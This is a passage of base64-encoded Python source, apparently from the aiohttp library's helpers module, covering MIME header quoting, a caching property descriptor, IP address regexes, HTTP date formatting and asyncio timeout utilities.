UID4gc2V0KGNvbnRlbnQpKTpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKGYiYmFkIGNvbnRlbnQgZm9yIHF1b3RlZC1zdHJpbmcge2NvbnRlbnQhcn0iKVxyXG4gICAgcmV0dXJuIG5vdF9xdGV4dF9yZS5zdWIobGFtYmRhIHg6ICJcXFxcIiArIHguZ3JvdXAoMCksIGNvbnRlbnQpXHJcblxyXG5cclxuZGVmIGNvbnRlbnRfZGlzcG9zaXRpb25faGVhZGVyKFxyXG4gICAgZGlzcHR5cGU6IHN0ciwgcXVvdGVfZmllbGRzOiBib29sID0gVHJ1ZSwgX2NoYXJzZXQ6IHN0ciA9ICJ1dGYtOCIsICoqcGFyYW1zOiBzdHJcclxuKSAtPiBzdHI6XHJcbiAgICAiIiJTZXRzIGBgQ29udGVudC1EaXNwb3NpdGlvbmBgIGhlYWRlciBmb3IgTUlNRS5cclxuXHJcbiAgICBUaGlzIGlzIHRoZSBNSU1FIHBheWxvYWQgQ29udGVudC1EaXNwb3NpdGlvbiBoZWFkZXIgZnJvbSBSRkMgMjE4M1xyXG4gICAgYW5kIFJGQyA3NTc5IHNlY3Rpb24gNC4yLCBub3QgdGhlIEhUVFAgQ29udGVudC1EaXNwb3NpdGlvbiBmcm9tXHJcbiAgICBSRkMgNjI2Ni5cclxuXHJcbiAgICBkaXNwdHlwZSBpcyBhIGRpc3Bvc2l0aW9uIHR5cGU6IGlubGluZSwgYXR0YWNobWVudCwgZm9ybS1kYXRhLlxyXG4gICAgU2hvdWxkIGJlIHZhbGlkIGV4dGVuc2lvbiB0b2tlbiAoc2VlIFJGQyAyMTgzKVxyXG5cclxuICAgIHF1b3RlX2ZpZWxkcyBwZXJmb3JtcyB2YWx1ZSBxdW90aW5nIHRvIDctYml0IE1JTUUgaGVhZGVyc1xyXG4gICAgYWNjb3JkaW5nIHRvIFJGQyA3NTc4LiBTZXQgdG8gcXVvdGVfZmllbGRzIHRvIEZhbHNlIGlmIHJlY2lwaWVudFxyXG4gICAgY2FuIHRha2UgOC1iaXQgZmlsZSBuYW1lcyBhbmQgZmllbGQgdmFsdWVzLlxyXG5cclxuICAgIF9jaGFyc2V0IHNwZWNpZmllcyB0aGUgY2hhcnNldCB0byB1c2Ugd2hlbiBxdW90ZV9maWVsZHMgaXMgVHJ1ZS5cclxuXHJcbiAgICBwYXJhbXMgaXMgYSBkaWN0IHdpdGggZGlzcG9zaXRpb24gcGFyYW1zLlxyXG4gICAgIiIiXHJcbiAgICBpZiBub3QgZGlzcHR5cGUgb3Igbm90IChUT0tFTiA+IHNldChkaXNwdHlwZSkpOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoImJhZCBjb250ZW50IGRpc3Bvc2l0aW9uIHR5cGUgeyFyfSIgIiIuZm9ybWF0KGRpc3B0eXBlKSlcclxuXHJcbiAgICB2YWx1ZSA9IGRpc3B0eXBlXHJcbiAgICBpZiBwYXJhbXM6XHJcbiAgICAgICAgbHBhcmFtcyA9IFtdXHJcbiAgICAgICAgZm9yIGtleSwgdmFsIGluIHBhcmFtcy5pdGVtcygpOlxyXG4gICAgICAgICAgICBpZiBub3Qga2V5IG9yIG5vdCAoVE9LRU4gPiBzZXQoa2V5KSk6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJiYWQgY29udGVudCBkaXNwb3NpdGlvbiBwYXJhbWV0ZXIiICIgeyFyfT17IXJ9Ii5mb3JtYXQoa2V5LCB2YWwpXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGlmIHF1b3RlX2ZpZWxkczpcclxuICAgICAgICAgICAgICAgIGlmIGtleS5sb3dlcigpID09ICJmaWxlbmFtZSI6XHJcbiAgICAgICAgICAgICAgICAgICAgcXZhbCA9IHF1b3RlKHZhbCwgIiIsIGVuY29kaW5nPV9jaGFyc2V0KVxyXG4gICAgICAgICAgICAgICAgICAgIGxwYXJhbXMuYXBwZW5kKChrZXksIFwnIiVzIlwnICUgcXZhbCkpXHJcbiAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgcXZhbCA9IHF1b3RlZF9zdHJpbmcodmFsKVxyXG4gICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBxdmFsID0gIiIuam9pbihcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIChfY2hhcnNldCwgIlwnXCciLCBxdW90ZSh2YWwsICIiLCBlbmNvZGluZz1fY2hhcnNldCkpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgICAgICAgICAgbHBhcmFtcy5hcHBlbmQoKGtleSArICIqIiwgcXZhbCkpXHJcbiAgICAgICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgbHBhcmFtcy5hcHBlbmQoKGtleSwgXCciJXMiXCcgJSBxdmFsKSlcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHF2YWwgPSB2YWwucmVwbGFjZSgiXFxcXCIsICJcXFxcXFxcXCIpLnJlcGxhY2UoXCciXCcsIFwnXFxcXCJcJylcclxuICAgICAgICAgICAgICAgIGxwYXJhbXMuYXBwZW5kKChrZXksIFwnIiVzIlwnICUgcXZhbCkpXHJcbiAgICAgICAgc3BhcmFtcyA9ICI7ICIuam9pbigiPSIuam9pbihwYWlyKSBmb3IgcGFpciBpbiBscGFyYW1zKVxyXG4gICAgICAgIHZhbHVlID0gIjsgIi5qb2luKCh2YWx1ZSwgc3BhcmFtcykpXHJcbiAgICByZXR1cm4gdmFsdWVcclxuXHJcblxyXG5jbGFzcyBfVFNlbGYoUHJvdG9jb2wsIEdlbmVyaWNbX1RdKTpcclxuICAgIF9jYWNoZTogRGljdFtzdHIsIF9UXVxyXG5cclxuXHJcbmNsYXNzIHJlaWZ5KEdlbmVyaWNbX1RdKTpcclxuICAgICIiIlVzZSBhcyBhIGNsYXNzIG1ldGhvZCBkZWNvcmF0b3IuXHJcblxyXG4gICAgSXQgb3BlcmF0ZXMgYWxtb3N0IGV4YWN0bHkgbGlrZVxyXG4gICAgdGhlIFB5dGhvbiBgQHByb3BlcnR5YCBkZWNvcmF0b3IsIGJ1dCBpdCBwdXRzIHRoZSByZXN1bHQgb2YgdGhlXHJcbiAgICBtZXRob2QgaXQgZGVjb3JhdGVzIGludG8gdGhlIGluc3RhbmNlIGRpY3QgYWZ0ZXIgdGhlIGZpcnN0IGNhbGwsXHJcbiAgICBlZmZlY3RpdmVseSByZXBsYWNpbmcgdGhlIGZ1bmN0aW9uIGl0IGRlY29yYXRlcyB3aXRoIGFuIGluc3RhbmNlXHJcbiAgICB2YXJpYWJsZS4gIEl0IGlzLCBpbiBQeXRob24gcGFybGFuY2UsIGEgZGF0YSBkZXNjcmlwdG9yLlxyXG4gICAgIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHdyYXBwZWQ6IENhbGxhYmxlWy4uLiwgX1RdKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYud3JhcHBlZCA9IHdyYXBwZWRcclxuICAgICAgICBzZWxmLl9fZG9jX18gPSB3cmFwcGVkLl9fZG9jX19cclxuICAgICAgICBzZWxmLm5hbWUgPSB3cmFwcGVkLl9fbmFtZV9fXHJcblxyXG4gICAgZGVmIF9fZ2V0X18oc2VsZiwgaW5zdDogX1RTZWxmW19UXSwgb3duZXI6IE9wdGlvbmFsW1R5cGVbQW55XV0gPSBOb25lKSAtPiBfVDpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBpbnN0Ll9jYWNoZVtzZWxmLm5hbWVdXHJcbiAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjpcclxuICAgICAgICAgICAgICAgIHZhbCA9IHNlbGYud3JhcHBlZChpbnN0KVxyXG4gICAgICAgICAgICAgICAgaW5zdC5fY2FjaGVbc2VsZi5uYW1lXSA9IHZhbFxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIHZhbFxyXG4gICAgICAgIGV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjpcclxuICAgICAgICAgICAgaWYgaW5zdCBpcyBOb25lOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIHNlbGZcclxuICAgICAgICAgICAgcmFpc2VcclxuXHJcbiAgICBkZWYgX19zZXRfXyhzZWxmLCBpbnN0OiBfVFNlbGZbX1RdLCB2YWx1ZTogX1QpIC0+IE5vbmU6XHJcbiAgICAgICAgcmFpc2UgQXR0cmlidXRlRXJyb3IoInJlaWZpZWQgcHJvcGVydHkgaXMgcmVhZC1vbmx5IilcclxuXHJcblxyXG5yZWlmeV9weSA9IHJlaWZ5XHJcblxyXG50cnk6XHJcbiAgICBmcm9tIC5faGVscGVycyBpbXBvcnQgcmVpZnkgYXMgcmVpZnlfY1xyXG5cclxuICAgIGlmIG5vdCBOT19FWFRFTlNJT05TOlxyXG4gICAgICAgIHJlaWZ5ID0gcmVpZnlfYyAgIyB0eXBlOiBpZ25vcmVbbWlzYyxhc3NpZ25tZW50XVxyXG5leGNlcHQgSW1wb3J0RXJyb3I6XHJcbiAgICBwYXNzXHJcblxyXG5faXB2NF9wYXR0ZXJuID0gKFxyXG4gICAgciJeKD86KD86MjVbMC01XXwyWzAtNF1bMC05XXxbMDFdP1swLTldWzAtOV0/KVxcLil7M30iXHJcbiAgICByIig/OjI1WzAtNV18MlswLTRdWzAtOV18WzAxXT9bMC05XVswLTldPykkIlxyXG4pXHJcbl9pcHY2X3BhdHRlcm4gPSAoXHJcbiAgICByIl4oPzooPzooPzpbQS1GMC05XXsxLDR9Oil7Nn18KD89KD86W0EtRjAtOV17MCw0fTopezAsNn0iXHJcbiAgICByIig/OlswLTldezEsM31cXC4pezN9WzAtOV17MSwzfSQpKChbMC05QS1GXXsxLDR9Oil7MCw1fXw6KSJcclxuICAgIHIiKCg6WzAtOUEtRl17MSw0fSl7MSw1fTp8Oil8OjooPzpbQS1GMC05XXsxLDR9Oil7NX0pIlxyXG4gICAgciIoPzooPzoyNVswLTVdfDJbMC00XVswLTldfDFbMC05XVswLTldfFsxLTldP1swLTldKVxcLil7M30iXHJcbiAgICByIig/OjI1WzAtNV18MlswLTRdWzAtOV18MVswLTldWzAtOV18WzEtOV0/WzAtOV0pfCg/OltBLUYwLTldezEsNH06KXs3fSJcclxuICAgIHIiW0EtRjAtOV17MSw0fXwoPz0oPzpbQS1GMC05XXswLDR9Oil7MCw3fVtBLUYwLTldezAsNH0kKSJcclxuICAgIHIiKChbMC05QS1GXXsxLDR9Oil7MSw3fXw6KSgoOlswLTlBLUZdezEsNH0pezEsN318Oil8KD86W0EtRjAtOV17MSw0fTopezd9IlxyXG4gICAgciI6fDooOltBLUYwLTldezEsNH0pezd9KSQiXHJcbilcclxuX2lwdjRfcmVnZXggPSByZS5jb21waWxlKF9pcHY0X3BhdHRlcm4pXHJcbl9pcHY2X3JlZ2V4ID0gcmUuY29tcGlsZShfaXB2Nl9wYXR0ZXJuLCBmbGFncz1yZS5JR05PUkVDQVNFKVxyXG5faXB2NF9yZWdleGIgPSByZS5jb21waWxlKF9pcHY0X3BhdHRlcm4uZW5jb2RlKCJhc2NpaSIpKVxyXG5faXB2Nl9yZWdleGIgPSByZS5jb21waWxlKF9pcHY2X3BhdHRlcm4uZW5jb2RlKCJhc2NpaSIpLCBmbGFncz1yZS5JR05PUkVDQVNFKVxyXG5cclxuXHJcbmRlZiBfaXNfaXBfYWRkcmVzcyhcclxuICAgIHJlZ2V4OiBQYXR0ZXJuW3N0cl0sIHJlZ2V4YjogUGF0dGVybltieXRlc10sIGhvc3Q6IE9wdGlvbmFsW1VuaW9uW3N0ciwgYnl0ZXNdXVxyXG4pIC0+IGJvb2w6XHJcbiAgICBpZiBob3N0IGlzIE5vbmU6XHJcbiAgICAgICAgcmV0dXJuIEZhbHNlXHJcbiAgICBpZiBpc2luc3RhbmNlKGhvc3QsIHN0cik6XHJcbiAgICAgICAgcmV0dXJuIGJvb2wocmVnZXgubWF0Y2goaG9zdCkpXHJcbiAgICBlbGlmIGlzaW5zdGFuY2UoaG9zdCwgKGJ5dGVzLCBieXRlYXJyYXksIG1lbW9yeXZpZXcpKTpcclxuICAgICAgICByZXR1cm4gYm9vbChyZWdleGIubWF0Y2goaG9zdCkpXHJcbiAgICBlbHNlOlxyXG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcihmIntob3N0fSBbe3R5cGUoaG9zdCl9XSBpcyBub3QgYSBzdHIgb3IgYnl0ZXMiKVxyXG5cclxuXHJcbmlzX2lwdjRfYWRkcmVzcyA9IGZ1bmN0b29scy5wYXJ0aWFsKF9pc19pcF9hZGRyZXNzLCBfaXB2NF9yZWdleCwgX2lwdjRfcmVnZXhiKVxyXG5pc19pcHY2X2FkZHJlc3MgPSBmdW5jdG9vbHMucGFydGlhbChfaXNfaXBfYWRkcmVzcywgX2lwdjZfcmVnZXgsIF9pcHY2X3JlZ2V4YilcclxuXHJcblxyXG5kZWYgaXNfaXBfYWRkcmVzcyhob3N0OiBPcHRpb25hbFtVbmlvbltzdHIsIGJ5dGVzLCBieXRlYXJyYXksIG1lbW9yeXZpZXddXSkgLT4gYm9vbDpcclxuICAgIHJldHVybiBpc19pcHY0X2FkZHJlc3MoaG9zdCkgb3IgaXNfaXB2Nl9hZGRyZXNzKGhvc3QpXHJcblxyXG5cclxuZGVmIG5leHRfd2hvbGVfc2Vjb25kKCkgLT4gZGF0ZXRpbWUuZGF0ZXRpbWU6XHJcbiAgICAiIiJSZXR1cm4gY3VycmVudCB0aW1lIHJvdW5kZWQgdXAgdG8gdGhlIG5leHQgd2hvbGUgc2Vjb25kLiIiIlxyXG4gICAgcmV0dXJuIGRhdGV0aW1lLmRhdGV0aW1lLm5vdyhkYXRldGltZS50aW1lem9uZS51dGMpLnJlcGxhY2UoXHJcbiAgICAgICAgbWljcm9zZWNvbmQ9MFxyXG4gICAgKSArIGRhdGV0aW1lLnRpbWVkZWx0YShzZWNvbmRzPTApXHJcblxyXG5cclxuX2NhY2hlZF9jdXJyZW50X2RhdGV0aW1lID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtpbnRdXHJcbl9jYWNoZWRfZm9ybWF0dGVkX2RhdGV0aW1lID0gIiJcclxuXHJcblxyXG5kZWYgcmZjODIyX2Zvcm1hdHRlZF90aW1lKCkgLT4gc3RyOlxyXG4gICAgZ2xvYmFsIF9jYWNoZWRfY3VycmVudF9kYXRldGltZVxyXG4gICAgZ2xvYmFsIF9jYWNoZWRfZm9ybWF0dGVkX2RhdGV0aW1lXHJcblxyXG4gICAgbm93ID0gaW50KHRpbWUudGltZSgpKVxyXG4gICAgaWYgbm93ICE9IF9jYWNoZWRfY3VycmVudF9kYXRldGltZTpcclxuICAgICAgICAjIFdlZWtkYXkgYW5kIG1vbnRoIG5hbWVzIGZvciBIVFRQIGRhdGUvdGltZSBmb3JtYXR0aW5nO1xyXG4gICAgICAgICMgYWx3YXlzIEVuZ2xpc2ghXHJcbiAgICAgICAgIyBUdXBsZXMgYXJlIGNvbnN0YW50cyBzdG9yZWQgaW4gY29kZW9iamVjdCFcclxuICAgICAgICBfd2Vla2RheW5hbWUgPSAoIk1vbiIsICJUdWUiLCAiV2VkIiwgIlRodSIsICJGcmkiLCAiU2F0IiwgIlN1biIpXHJcbiAgICAgICAgX21vbnRobmFtZSA9IChcclxuICAgICAgICAgICAgIiIsICAjIER1bW15IHNvIHdlIGNhbiB1c2UgMS1iYXNlZCBtb250aCBudW1iZXJzXHJcbiAgICAgICAgICAgICJKYW4iLFxyXG4gICAgICAgICAgICAiRmViIixcclxuICAgICAgICAgICAgIk1hciIsXHJcbiAgICAgICAgICAgICJBcHIiLFxyXG4gICAgICAgICAgICAiTWF5IixcclxuICAgICAgICAgICAgIkp1biIsXHJcbiAgICAgICAgICAgICJKdWwiLFxyXG4gICAgICAgICAgICAiQXVnIixcclxuICAgICAgICAgICAgIlNlcCIsXHJcbiAgICAgICAgICAgICJPY3QiLFxyXG4gICAgICAgICAgICAiTm92IixcclxuICAgICAgICAgICAgIkRlYyIsXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICB5ZWFyLCBtb250aCwgZGF5LCBoaCwgbW0sIHNzLCB3ZCwgKnRhaWwgPSB0aW1lLmdtdGltZShub3cpXHJcbiAgICAgICAgX2NhY2hlZF9mb3JtYXR0ZWRfZGF0ZXRpbWUgPSAiJXMsICUwMmQgJTNzICU0ZCAlMDJkOiUwMmQ6JTAyZCBHTVQiICUgKFxyXG4gICAgICAgICAgICBfd2Vla2RheW5hbWVbd2RdLFxyXG4gICAgICAgICAgICBkYXksXHJcbiAgICAgICAgICAgIF9tb250aG5hbWVbbW9udGhdLFxyXG4gICAgICAgICAgICB5ZWFyLFxyXG4gICAgICAgICAgICBoaCxcclxuICAgICAgICAgICAgbW0sXHJcbiAgICAgICAgICAgIHNzLFxyXG4gICAgICAgIClcclxuICAgICAgICBfY2FjaGVkX2N1cnJlbnRfZGF0ZXRpbWUgPSBub3dcclxuICAgIHJldHVybiBfY2FjaGVkX2Zvcm1hdHRlZF9kYXRldGltZVxyXG5cclxuXHJcbmRlZiBfd2Vha3JlZl9oYW5kbGUoaW5mbzogIlR1cGxlW3dlYWtyZWYucmVmW29iamVjdF0sIHN0cl0iKSAtPiBOb25lOlxyXG4gICAgcmVmLCBuYW1lID0gaW5mb1xyXG4gICAgb2IgPSByZWYoKVxyXG4gICAgaWYgb2IgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgd2l0aCBzdXBwcmVzcyhFeGNlcHRpb24pOlxyXG4gICAgICAgICAgICBnZXRhdHRyKG9iLCBuYW1lKSgpXHJcblxyXG5cclxuZGVmIHdlYWtyZWZfaGFuZGxlKFxyXG4gICAgb2I6IG9iamVjdCwgbmFtZTogc3RyLCB0aW1lb3V0OiBmbG9hdCwgbG9vcDogYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcFxyXG4pIC0+IE9wdGlvbmFsW2FzeW5jaW8uVGltZXJIYW5kbGVdOlxyXG4gICAgaWYgdGltZW91dCBpcyBub3QgTm9uZSBhbmQgdGltZW91dCA+IDA6XHJcbiAgICAgICAgd2hlbiA9IGxvb3AudGltZSgpICsgdGltZW91dFxyXG4gICAgICAgIGlmIHRpbWVvdXQgPj0gNTpcclxuICAgICAgICAgICAgd2hlbiA9IGNlaWwod2hlbilcclxuXHJcbiAgICAgICAgcmV0dXJuIGxvb3AuY2FsbF9hdCh3aGVuLCBfd2Vha3JlZl9oYW5kbGUsICh3ZWFrcmVmLnJlZihvYiksIG5hbWUpKVxyXG4gICAgcmV0dXJuIE5vbmVcclxuXHJcblxyXG5kZWYgY2FsbF9sYXRlcihcclxuICAgIGNiOiBDYWxsYWJsZVtbXSwgQW55XSwgdGltZW91dDogZmxvYXQsIGxvb3A6IGFzeW5jaW8uQWJzdHJhY3RFdmVudExvb3BcclxuKSAtPiBPcHRpb25hbFthc3luY2lvLlRpbWVySGFuZGxlXTpcclxuICAgIGlmIHRpbWVvdXQgaXMgbm90IE5vbmUgYW5kIHRpbWVvdXQgPiAwOlxyXG4gICAgICAgIHdoZW4gPSBsb29wLnRpbWUoKSArIHRpbWVvdXRcclxuICAgICAgICBpZiB0aW1lb3V0ID4gNTpcclxuICAgICAgICAgICAgd2hlbiA9IGNlaWwod2hlbilcclxuICAgICAgICByZXR1cm4gbG9vcC5jYWxsX2F0KHdoZW4sIGNiKVxyXG4gICAgcmV0dXJuIE5vbmVcclxuXHJcblxyXG5jbGFzcyBUaW1lb3V0SGFuZGxlOlxyXG4gICAgIiIiVGltZW91dCBoYW5kbGUiIiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZiwgbG9vcDogYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcCwgdGltZW91dDogT3B0aW9uYWxbZmxvYXRdXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fdGltZW91dCA9IHRpbWVvdXRcclxuICAgICAgICBzZWxmLl9sb29wID0gbG9vcFxyXG4gICAgICAgIHNlbGYuX2NhbGxiYWNrcyA9IChcclxuICAgICAgICAgICAgW11cclxuICAgICAgICApICAjIHR5cGU6IExpc3RbVHVwbGVbQ2FsbGFibGVbLi4uLCBOb25lXSwgVHVwbGVbQW55LCAuLi5dLCBEaWN0W3N0ciwgQW55XV1dXHJcblxyXG4gICAgZGVmIHJlZ2lzdGVyKFxyXG4gICAgICAgIHNlbGYsIGNhbGxiYWNrOiBDYWxsYWJsZVsuLi4sIE5vbmVdLCAqYXJnczogQW55LCAqKmt3YXJnczogQW55XHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fY2FsbGJhY2tzLmFwcGVuZCgoY2FsbGJhY2ssIGFyZ3MsIGt3YXJncykpXHJcblxyXG4gICAgZGVmIGNsb3NlKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fY2FsbGJhY2tzLmNsZWFyKClcclxuXHJcbiAgICBkZWYgc3RhcnQoc2VsZikgLT4gT3B0aW9uYWxbYXN5bmNpby5IYW5kbGVdOlxyXG4gICAgICAgIHRpbWVvdXQgPSBzZWxmLl90aW1lb3V0XHJcbiAgICAgICAgaWYgdGltZW91dCBpcyBub3QgTm9uZSBhbmQgdGltZW91dCA+IDA6XHJcbiAgICAgICAgICAgIHdoZW4gPSBzZWxmLl9sb29wLnRpbWUoKSArIHRpbWVvdXRcclxuICAgICAgICAgICAgaWYgdGltZW91dCA+PSA1OlxyXG4gICAgICAgICAgICAgICAgd2hlbiA9IGNlaWwod2hlbilcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2xvb3AuY2FsbF9hdCh3aGVuLCBzZWxmLl9fY2FsbF9fKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJldHVybiBOb25lXHJcblxyXG4gICAgZGVmIHRpbWVyKHNlbGYpIC0+ICJCYXNlVGltZXJDb250ZXh0IjpcclxuICAgICAgICBpZiBzZWxmLl90aW1lb3V0IGlzIG5vdCBOb25lIGFuZCBzZWxmLl90aW1lb3V0ID4gMDpcclxuICAgICAgICAgICAgdGltZXIgPSBUaW1lckNvbnRleHQoc2VsZi5fbG9vcClcclxuICAgICAgICAgICAgc2VsZi5yZWdpc3Rlcih0aW1lci50aW1lb3V0KVxyXG4gICAgICAgICAgICByZXR1cm4gdGltZXJcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByZXR1cm4gVGltZXJOb29wKClcclxuXHJcbiAgICBkZWYgX19jYWxsX18oc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBmb3IgY2IsIGFyZ3MsIGt3YXJncyBpbiBzZWxmLl9jYWxsYmFja3M6XHJcbiAgICAgICAgICAgIHdpdGggc3VwcHJlc3MoRXhjZXB0aW9uKTpcclxuICAgICAgICAgICAgICAgIGNiKCphcmdzLCAqKmt3YXJncylcclxuXHJcbiAgICAgICAgc2VsZi5fY2FsbGJhY2tzLmNsZWFyKClcclxuXHJcblxyXG5jbGFzcyBCYXNlVGltZXJDb250ZXh0KENvbnRleHRNYW5hZ2VyWyJCYXNlVGltZXJDb250ZXh0Il0pOlxyXG4gICAgcGFzc1xyXG5cclxuXHJcbmNsYXNzIFRpbWVyTm9vcChCYXNlVGltZXJDb250ZXh0KTpcclxuICAgIGRlZiBfX2VudGVyX18oc2VsZikgLT4gQmFzZVRpbWVyQ29udGV4dDpcclxuICAgICAgICByZXR1cm4gc2VsZlxyXG5cclxuICAgIGRlZiBfX2V4aXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGV4Y190eXBlOiBPcHRpb25hbFtUeXBlW0Jhc2VFeGNlcHRpb25dXSxcclxuICAgICAgICBleGNfdmFsOiBPcHRpb25hbFtCYXNlRXhjZXB0aW9uXSxcclxuICAgICAgICBleGNfdGI6IE9wdGlvbmFsW1RyYWNlYmFja1R5cGVdLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHJldHVyblxyXG5cclxuXHJcbmNsYXNzIFRpbWVyQ29udGV4dChCYXNlVGltZXJDb250ZXh0KTpcclxuICAgICIiIkxvdyByZXNvbHV0aW9uIHRpbWVvdXQgY29udGV4dCBtYW5hZ2VyIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGxvb3A6IGFzeW5jaW8uQWJzdHJhY3RFdmVudExvb3ApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fbG9vcCA9IGxvb3BcclxuICAgICAgICBzZWxmLl90YXNrcyA9IFtdICAjIHR5cGU6IExpc3RbYXN5bmNpby5UYXNrW0FueV1dXHJcbiAgICAgICAgc2VsZi5fY2FuY2VsbGVkID0gRmFsc2VcclxuXHJcbiAgICBkZWYgX19lbnRlcl9fKHNlbGYpIC0+IEJhc2VUaW1lckNvbnRleHQ6XHJcbiAgICAgICAgdGFzayA9IGN1cnJlbnRfdGFzayhsb29wPXNlbGYuX2xvb3ApXHJcblxyXG4gICAgICAgIGlmIHRhc2sgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIlRpbWVvdXQgY29udGV4dCBtYW5hZ2VyIHNob3VsZCBiZSB1c2VkICIgImluc2lkZSBhIHRhc2siXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgaWYgc2VsZi5fY2FuY2VsbGVkOlxyXG4gICAgICAgICAgICByYWlzZSBhc3luY2lvLlRpbWVvdXRFcnJvciBmcm9tIE5vbmVcclxuXHJcbiAgICAgICAgc2VsZi5fdGFza3MuYXBwZW5kKHRhc2spXHJcbiAgICAgICAgcmV0dXJuIHNlbGZcclxuXHJcbiAgICBkZWYgX19leGl0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBleGNfdHlwZTogT3B0aW9uYWxbVHlwZVtCYXNlRXhjZXB0aW9uXV0sXHJcbiAgICAgICAgZXhjX3ZhbDogT3B0aW9uYWxbQmFzZUV4Y2VwdGlvbl0sXHJcbiAgICAgICAgZXhjX3RiOiBPcHRpb25hbFtUcmFjZWJhY2tUeXBlXSxcclxuICAgICkgLT4gT3B0aW9uYWxbYm9vbF06XHJcbiAgICAgICAgaWYgc2VsZi5fdGFza3M6XHJcbiAgICAgICAgICAgIHNlbGYuX3Rhc2tzLnBvcCgpXHJcblxyXG4gICAgICAgIGlmIGV4Y190eXBlIGlzIGFzeW5jaW8uQ2FuY2VsbGVkRXJyb3IgYW5kIHNlbGYuX2NhbmNlbGxlZDpcclxuICAgICAgICAgICAgcmFpc2UgYXN5bmNpby5UaW1lb3V0RXJyb3IgZnJvbSBOb25lXHJcbiAgICAgICAgcmV0dXJuIE5vbmVcclxuXHJcbiAgICBkZWYgdGltZW91dChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBzZWxmLl9jYW5jZWxsZWQ6XHJcbiAgICAgICAgICAgIGZvciB0YXNrIGluIHNldChzZWxmLl90YXNrcyk6XHJcbiAgICAgICAgICAgICAgICB0YXNrLmNhbmNlbCgpXHJcblxyXG4gICAgICAgICAgICBzZWxmLl9jYW5jZWxsZWQgPSBUcnVlXHJcblxyXG5cclxuZGVmIGNlaWxfdGltZW91dChkZWxheTogT3B0aW9uYWxbZmxvYXRdKSAtPiBhc3luY190aW1lb3V0LlRpbWVvdXQ6XHJcbiAgICBpZiBkZWxheSBpcyBOb25lIG9yIGRlbGF5IDw9IDA6XHJcbiAgICAgICAgcmV0dXJuIGFzeW5jX3RpbWVvdXQudGltZW91dChOb25lKVxyXG5cclxuICAgIGxvb3AgPSBnZXRfcnVubmluZ19sb29wKClcclxuICAgIG5vdyA9IGxvb3AudGltZSgpXHJcbiAgICB3aGVuID0gbm93ICsgZGVsYXlcclxuICAgIGlmIGRlbGF5ID4gNTpcclxuICAgICAgICB3aGVuID0gY2VpbCh3aGVuKVxyXG4gICAgcmV0dXJuIGFzeW5jX3RpbWVvdXQudGltZW91dF9hdCh3aGVuKVxyXG5cclxuXHJcbmNsYXNzIEhlYWRlcnNNaXhpbjpcclxuXHJcbiAgICBBVFRSUyA9IGZyb3plbnNldChbIl9jb250ZW50X3R5cGUiLCAiX2NvbnRlbnRfZGljdCIsICJfc3RvcmVkX2NvbnRlbnRfdHlwZSJdKVxyXG5cclxuICAgIF9jb250ZW50X3R5cGUgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW3N0cl1cclxuICAgIF9jb250ZW50X2RpY3QgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW0RpY3Rbc3RyLCBzdHJdXVxyXG4gICAgX3N0b3JlZF9jb250ZW50X3R5cGUgPSBzZW50aW5lbFxyXG5cclxuICAgIGRlZiBfcGFyc2VfY29udGVudF90eXBlKHNlbGYsIHJhdzogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX3N0b3JlZF9jb250ZW50X3R5cGUgPSByYXdcclxuICAgICAgICBpZiByYXcgaXMgTm9uZTpcclxuICAgICAgICAgICAgIyBkZWZhdWx0IHZhbHVlIGFjY29yZGluZyB0byBSRkMgMjYxNlxyXG4gICAgICAgICAgICBzZWxmLl9jb250ZW50X3R5cGUgPSAiYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIl